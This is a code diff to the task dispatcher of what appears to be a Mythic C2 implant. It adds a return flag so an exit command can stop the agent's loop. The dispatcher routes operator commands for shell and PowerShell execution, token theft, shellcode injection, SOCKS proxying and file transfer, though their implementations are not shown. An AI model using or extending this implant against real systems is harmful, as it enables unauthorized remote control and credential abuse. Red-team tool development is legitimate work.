@@ -23,21 +23,22 @@
  * @param [in] cmd Task command ID.
  * @param [in] taskUuid Mythic's UUID for tracking tasks.
  * @param [in] taskParser PPARSER struct containing data related to the task.
- * @return VOID
+ * @return BOOL - TRUE if agent should exit, FALSE if not
  */
-VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
+BOOL TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
+    BOOL exit = FALSE;
     switch (cmd) {
         case NORMAL_RESP:
         {
             _dbg("NORMAL_RESP was called");
-            return;
+            return exit;
         }
 #ifdef INCLUDE_CMD_STATUS     // Built-in
         case STATUS_CMD:
         {
             _dbg("STATUS_CMD was called");
             AgentStatus(taskUuid, taskParser);
-            return;
+            return exit;
         }
 #endif
 #ifdef INCLUDE_CMD_SLEEP    // Built-in
@@ -45,7 +46,7 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         {
             _dbg("CMD_SLEEP was called");
             AgentSleep(taskUuid, taskParser);
-            return;
+            return exit;
         }
 #endif
 #ifdef INCLUDE_CMD_EXAMPLE
@@ -53,7 +54,7 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         {
             _dbg("EXAMPLE_CMD was called");
             // CommandExample(taskParser);
-            return;
+            return exit;
         }
 #endif
 #ifdef INCLUDE_CMD_CD
@@ -61,7 +62,7 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         {
             _dbg("CD_CMD was called");
             FileSystemCd(taskUuid, taskParser);
-            return;
+            return exit;
         }
 #endif
 #ifdef INCLUDE_CMD_PWD
@@ -69,7 +70,7 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         {
             _dbg("PWD_CMD was called");
             FileSystemPwd(taskUuid, taskParser);
-            return;
+            return exit;
         }
 #endif
 #ifdef INCLUDE_CMD_MKDIR
@@ -77,7 +78,7 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         {
             _dbg("MKDIR_CMD was called");
             FileSystemMkdir(taskUuid, taskParser);
-            return;
+            return exit;
         }
 #endif
 #ifdef INCLUDE_CMD_CP
@@ -85,7 +86,7 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         {
             _dbg("CP_CMD was called");
             FileSystemCopy(taskUuid, taskParser);
-            return;
+            return exit;
         }
 #endif
 #ifdef INCLUDE_CMD_LS
@@ -93,7 +94,7 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         {
             _dbg("LS_CMD was called");
             FileSystemList(taskUuid, taskParser);
-            return;
+            return exit;
         }
 #endif
 #ifdef INCLUDE_CMD_RM
@@ -101,7 +102,7 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         {
             _dbg("RM_CMD was called");
             FileSystemRemove(taskUuid, taskParser);
-            return;
+            return exit;
         }
 #endif
 #ifdef INCLUDE_CMD_DOWNLOAD
@@ -109,13 +110,13 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         {
             _dbg("DOWNLOAD_CMD was called");
             Download(taskUuid, taskParser);
-            return;
+            return exit;
         }
         case DOWNLOAD_RESP:
         {
             _dbg("DOWNLOAD_RESP was called");
             DownloadSync(taskUuid, taskParser);
-            return;
+            return exit;
         }
 #endif
 #ifdef INCLUDE_CMD_UPLOAD
@@ -123,13 +124,13 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         {
             _dbg("UPLOAD_CMD was called");
             Upload(taskUuid, taskParser);
-            return;
+            return exit;
         }
         case UPLOAD_RESP:
         {
             _dbg("UPLOAD_RESP was called");
             UploadSync(taskUuid, taskParser);
-            return;
+            return exit;
         }
 #endif
 #ifdef INCLUDE_CMD_SHELL
@@ -137,15 +138,15 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         {
             _dbg("SHELL_CMD was called");
             ShellCmd(taskUuid, taskParser);
-            return;
+            return exit;
         }
 #endif
 #ifdef INCLUDE_CMD_EXIT
         case EXIT_CMD:
         {
             _dbg("EXIT_CMD was called");
-            Exit(taskUuid, taskParser);
-            return;
+            exit = Exit(taskUuid, taskParser);
+            return exit;  // TRUE
         }
 #endif
 #ifdef INCLUDE_CMD_PS
@@ -153,7 +154,7 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         {
             _dbg("PROCLIST_CMD was called");
             ProcessList(taskUuid, taskParser);
-            return;
+            return exit;
         }
 #endif
 #ifdef INCLUDE_CMD_GETUID
@@ -161,7 +162,7 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         {
             _dbg("GETUID was called");
             TokenGetUid(taskUuid, taskParser);
-            return;
+            return exit;
         }
 #endif
 #ifdef INCLUDE_CMD_STEAL_TOKEN
@@ -169,7 +170,7 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         {
             _dbg("STEAL_TOKEN_CMD was called");
             TokenSteal(taskUuid, taskParser);
-            return;
+            return exit;
         }
 #endif
 #ifdef INCLUDE_CMD_MAKE_TOKEN
@@ -177,7 +178,7 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         {
             _dbg("MAKE_TOKEN_CMD was called");
             TokenMake(taskUuid, taskParser);
-            return;
+            return exit;
         }
 #endif
 #ifdef INCLUDE_CMD_REV2SELF
@@ -185,7 +186,7 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         {
             _dbg("REV2SELF_CMD was called");
             TokenRevert(taskUuid, taskParser);
-            return;
+            return exit;
         }
 #endif
 #ifdef INCLUDE_CMD_PWSH
@@ -193,7 +194,7 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         {
             _dbg("PWSH_CMD was called");
             PwshCmd(taskUuid, taskParser);
-            return;
+            return exit;
         }
 #endif
 #ifdef INCLUDE_CMD_INLINE_EXECUTE
@@ -202,7 +203,7 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
             _dbg("INLINE_EXECUTE_CMD was called");
             
             InlineExecute(taskUuid, taskParser);
-            return;
+            return exit;
         }
 #endif
 #ifdef INCLUDE_CMD_SPAWNTO
@@ -210,7 +211,7 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         {
             _dbg("SPAWNTO_CMD was called");
             AgentSpawnto(taskUuid, taskParser);
-            return;
+            return exit;
         }
 #endif
 #ifdef INCLUDE_CMD_INJECT_SHELLCODE
@@ -218,7 +219,7 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         {
             _dbg("INJECT_SHELLCODE_CMD was called");
             InjectShellcode(taskUuid, taskParser);
-            return;
+            return exit;
         }
 #endif
 #ifdef INCLUDE_CMD_SOCKS
@@ -226,13 +227,13 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         {
             _dbg("SOCKS_CMD was called");
             Socks(taskUuid, taskParser);
-            return;
+            return exit;
         }
         case SOCKS_RESP:
         {
             _dbg("SOCKS_RESP was called");
             SocksProcessData(taskParser);
-            return;
+            return exit;
         }
 #endif
 #ifdef INCLUDE_CMD_LINK
@@ -240,13 +241,13 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         {
             _dbg("LINK_CMD was called");
             Link(taskUuid, taskParser);
-            return;
+            return exit;
         }
         case LINK_RESP:
         {
             _dbg("LINK_RESP was called");
             LinkSync(taskUuid, taskParser);
-            return;
+            return exit;
         }
 #endif
 #ifdef INCLUDE_CMD_UNLINK
@@ -254,7 +255,7 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         {
             _dbg("UNLINK_CMD was called");
             UnLink(taskUuid, taskParser);
-            return;
+            return exit;
         }
 #endif
     }// END OF CMDS
@@ -295,15 +296,16 @@ BOOL TaskCheckin(PPARSER parser)
 /**
  * @brief Process the tasks from the server
  * @param [in] tasks PPARSER struct containing the tasks
- * @return VOID
+ * @return BOOL. True if agent should exit, false if not
  */
-VOID TaskProcess(PPARSER tasks)
+BOOL TaskProcess(PPARSER tasks)
 {
     BYTE    Type        = NULL;
     UINT32  NumOfMsgs   = 0;
+    BOOL exit = FALSE;
 
     if ( tasks->Buffer == NULL || tasks->Length == 0 )
-        return;
+        return exit;
     
     // Determine the type of response from server (get_tasking, post_response, etc)
     Type = ParserGetByte(tasks);
@@ -311,7 +313,7 @@ VOID TaskProcess(PPARSER tasks)
     if ( Type != GET_TASKING )
     {
         _err("[NONE] Task not recognized!! Byte key -> %x\n\n", Type);
-        return;
+        return exit;
     }
 
     NumOfMsgs = ParserGetInt32(tasks);
@@ -320,9 +322,8 @@ VOID TaskProcess(PPARSER tasks)
 
 
     if ( NumOfMsgs == 0 )
-        return;
+        return exit;
 
-    
     for ( UINT32 i = 0; i < NumOfMsgs; i++ ) 
     {       
         PARSER taskParser = { 0 };
@@ -335,22 +336,24 @@ VOID TaskProcess(PPARSER tasks)
         
         ParserNew(&taskParser, taskBuffer, sizeTask);
         
-        TaskDispatch(taskId, taskUuid, &taskParser);
+        exit = TaskDispatch(taskId, taskUuid, &taskParser);
 
         ParserDestroy(&taskParser);
     }
+    return exit;
 }
 
 
 /**
  * @brief Main tasking loop
- * @return VOID
+ * @return BOOL - TRUE if agent should exit, FALSE if not
  */
-VOID TaskRoutine()
+BOOL TaskRoutine()
 {
     /* Send Msgs in the Queue */
 
     PARSER Output = { 0 };
+    BOOL exit = FALSE; 
 
 #ifdef HTTPX_TRANSPORT
 
@@ -413,7 +416,7 @@ VOID TaskRoutine()
     if ( Output.Buffer != NULL && Output.Length != 0 )
     {
         
-        TaskProcess(&Output);
+        exit = TaskProcess(&Output);
     }
 
     if (&Output != NULL) ParserDestroy(&Output);
@@ -446,5 +449,5 @@ CLEANUP:
     // zzzz
     SleepWithJitter(xenonConfig->sleeptime, xenonConfig->jitter);
 
-    return;
+    return exit;
 }
